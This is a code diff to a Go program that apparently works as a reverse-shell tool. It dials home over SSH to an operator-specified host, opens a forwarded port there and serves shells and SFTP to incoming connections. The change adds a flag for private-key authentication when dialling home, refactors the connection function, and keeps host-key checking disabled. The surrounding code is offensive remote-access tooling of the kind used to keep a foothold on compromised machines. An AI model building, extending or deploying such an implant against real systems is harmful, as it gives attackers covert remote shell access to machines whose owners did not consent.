@@ -38,14 +38,15 @@ import (
 )
 
 type params struct {
-	LUSER        string
-	LHOST        string
-	LPORT        uint
-	homeBindPort uint
-	listen       bool
-	shell        string
-	noShell      bool
-	verbose      bool
+	LUSER             string
+	LHOST             string
+	LPORT             uint
+	reverseSshKeyPath string
+	homeBindPort      uint
+	listen            bool
+	shell             string
+	noShell           bool
+	verbose           bool
 }
 
 func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCallback {
@@ -127,17 +128,22 @@ func createSFTPHandler() ssh.SubsystemHandler {
 	}
 }
 
-func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
+func dialHomeAndListen(address string, p *params) (net.Listener, error) {
 	var (
-		err    error
-		client *gossh.Client
+		err         error
+		client      *gossh.Client
+		authMethods []gossh.AuthMethod
 	)
 
+	if p.reverseSshKeyPath != "" {
+		if signer := loadSshPrivateKey(p.reverseSshKeyPath); signer != nil {
+			authMethods = append(authMethods, gossh.PublicKeys(signer))
+		}
+	}
+
 	config := &gossh.ClientConfig{
-		User: username,
-		Auth: []gossh.AuthMethod{
-			gossh.Password(localPassword),
-		},
+		User:            p.LUSER,
+		Auth:            append(authMethods, gossh.Password(localPassword)),
 		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
 	}
 
@@ -146,7 +152,7 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 		client, err = gossh.Dial("tcp", address, config)
 		if err == nil {
 			break
-		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
+		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && p.verbose {
 			fmt.Println("Enter password:")
 			data, err := term.ReadPassword(int(syscall.Stdin))
 			if err != nil {
@@ -162,7 +168,7 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 		}
 	}
 
-	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", homeBindPort))
+	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", p.homeBindPort))
 	if err != nil {
 		return nil, err
 	}
@@ -172,6 +178,22 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 	sendExtraInfo(client, ln.Addr().String())
 
 	return ln, nil
+}
+
+func loadSshPrivateKey(keyPath string) gossh.Signer {
+	key, err := ioutil.ReadFile(keyPath)
+	if err != nil {
+		log.Printf("Unable to read private key: %v", err)
+		return nil
+	}
+
+	signer, err := gossh.ParsePrivateKey(key)
+	if err != nil {
+		log.Printf("Unable to parse private key: %v", err)
+		return nil
+	}
+
+	return signer
 }
 
 type ExtraInfo struct {
@@ -250,6 +272,8 @@ Options:
 	-p, Port at which reverseSSH is listening for incoming ssh connections (bind scenario)
 		or where it tries to establish a ssh connection (reverse scenario) (default: %[6]s)
 	-b, Reverse scenario only: bind to this port after dialling home (default: %[7]s)
+	-i, Reverse scenario only: attempt to authenticate with this ssh private key when dialling home
+		(similar to ssh's identity_file)
 	-s, Shell to spawn for incoming connections, e.g. /bin/bash; (default: %[5]s)
 		for windows this can only be used to give a path to 'ssh-shellhost.exe' to
 		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
@@ -286,6 +310,7 @@ Credentials:
 	flag.UintVar(&p.homeBindPort, "b", uint(homeBindPort), "")
 	flag.BoolVar(&p.listen, "l", false, "")
 	flag.StringVar(&p.shell, "s", defaultShell, "")
+	flag.StringVar(&p.reverseSshKeyPath, "i", "", "")
 	flag.BoolVar(&p.noShell, "N", false, "")
 	flag.BoolVar(&p.verbose, "v", false, "")
 	flag.Parse()
@@ -358,7 +383,7 @@ func run(p *params, server ssh.Server) {
 	} else {
 		target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
 		log.Printf("Dialling home via ssh to %s", target)
-		ln, err = dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose)
+		ln, err = dialHomeAndListen(target, p)
 	}
 
 	if err != nil {
